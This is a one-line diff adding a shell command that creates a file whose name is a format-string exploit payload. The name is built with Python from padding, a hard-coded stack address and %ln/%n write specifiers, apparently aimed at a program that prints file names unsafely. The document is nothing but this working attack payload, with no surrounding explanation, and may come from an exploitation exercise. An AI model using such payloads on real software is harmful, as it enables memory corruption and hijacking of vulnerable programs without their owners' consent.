@@ -1,0 +1,1 @@
+touch `python -c 'print "ABCDEFGHIJKLMO" + "\x7f\xff\xff\xff\xe3\xd8"[::-1]+"%12\$ln" + "BB" * 20 + "%20\$n"'`
